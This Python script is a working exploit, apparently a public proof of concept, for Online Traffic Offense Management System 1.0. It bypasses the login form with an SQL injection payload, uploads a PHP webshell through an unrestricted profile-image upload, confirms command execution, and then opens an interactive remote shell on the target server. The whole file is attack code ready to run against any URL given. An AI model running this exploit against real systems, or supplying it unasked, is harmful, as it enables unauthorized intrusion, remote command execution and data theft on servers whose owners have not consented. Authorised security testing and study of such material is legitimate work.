#!/usr/bin/env python3
"""
Online Traffic Offense Management System 1.0 - Unauthenticated RCE
SQLi in the login form bypasses authentication, then a PHP webshell is uploaded
via the unrestricted file upload in /admin/?page=user.
No CVE assigned — referenced as EDB-ID 50221.

Usage: python3 exploit.py -u http://TARGET
"""

import sys
import time
import requests
import argparse
from bs4 import BeautifulSoup
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory

requests.packages.urllib3.disable_warnings()

WEBSHELL = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; system($_GET['cmd']); echo '</pre>'; die; } ?>"
SHELL_NAME = "evil.php"


def sqli_login(session, url):
    """Bypass authentication via SQL injection in the login endpoint."""
    r = session.post(
        f"{url}/classes/Login.php?f=login",
        data={"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"},
        timeout=10,
    )
    return r.text == '{"status":"success"}'


def get_user_info(session, url):
    """Scrape the current user's profile fields needed for the upload request."""
    r = session.get(f"{url}/admin/?page=user", timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    return {
        "id":        soup.find("input", {"name": "id"}).get("value"),
        "firstname": soup.find("input", {"id": "firstname"}).get("value"),
        "lastname":  soup.find("input", {"id": "lastname"}).get("value"),
        "username":  soup.find("input", {"id": "username"}).get("value"),
    }


def upload_shell(session, url, user):
    """
    Upload the PHP webshell via the profile picture field.
    The endpoint performs no file type validation and serves files from
    a web-accessible directory, allowing direct PHP execution.
    """
    r = session.post(
        f"{url}/classes/Users.php?f=save",
        data={
            "id":        user["id"],
            "firstname": user["firstname"],
            "lastname":  user["lastname"],
            "username":  user["username"],
            "password":  "",
        },
        files={"img": (SHELL_NAME, WEBSHELL, "application/x-php")},
        timeout=10,
    )
    return r.text == "1"


def find_shell_url(session, url):
    """Parse the profile page to find the uploaded shell's URL."""
    r = session.get(f"{url}/admin/?page=user", timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    img = soup.find("img", {"id": "cimg"})
    if img:
        src = img.get("src", "")
        print(f"[v] cimg src: {src}")
        if src.startswith("http"):
            return src
        # src is an absolute path (e.g. /management/uploads/...) — use origin only
        from urllib.parse import urlparse
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        return origin + src
    return None


def run_command(shell_url, command):
    """Execute a command via the uploaded webshell."""
    r = requests.get(shell_url, params={"cmd": command}, timeout=10, verify=False)
    return r.text.replace("<pre>", "").replace("</pre>", "").strip()


def interactive_shell(shell_url):
    """Open an interactive command loop against the uploaded webshell."""
    print(f"[+] Shell opened. Type 'exit' or Ctrl+C to quit.\n")
    session = PromptSession(history=InMemoryHistory())

    while True:
        try:
            command = session.prompt(
                HTML("<ansired><b>Shell> </b></ansired>"),
                auto_suggest=AutoSuggestFromHistory(),
            )
            command = command.strip()
            if not command:
                continue
            if command.lower() == "exit":
                return
            print(run_command(shell_url, command))
        except KeyboardInterrupt:
            print("\nBye!")
            return


def exploit(url):
    session = requests.Session()
    session.verify = False

    print("[*] Attempting SQLi login bypass...")
    if not sqli_login(session, url):
        print("[-] Login bypass failed. Target may not be vulnerable.")
        sys.exit(1)
    print("[+] Login bypassed")

    print("[*] Fetching user info...")
    user = get_user_info(session, url)

    print("[*] Uploading webshell...")
    if not upload_shell(session, url, user):
        print("[-] Upload failed")
        sys.exit(1)
    print("[+] Webshell uploaded")

    time.sleep(1)

    print("[*] Locating shell...")
    shell_url = find_shell_url(session, url)
    if not shell_url:
        print("[-] Could not find uploaded shell URL")
        sys.exit(1)

    # Verify execution
    output = run_command(shell_url, "id")
    if "uid=" not in output:
        print(f"[-] Shell found but command execution failed: {output}")
        sys.exit(1)

    print(f"[+] Shell URL: {shell_url}")
    print(f"[+] Target is vulnerable! Output: {output}")
    interactive_shell(shell_url)


def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for Online Traffic Offense Management System 1.0 - Unauthenticated RCE"
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. http://10.10.10.10)")
    args = parser.parse_args()
    exploit(args.url.rstrip("/"))


if __name__ == "__main__":
    main()
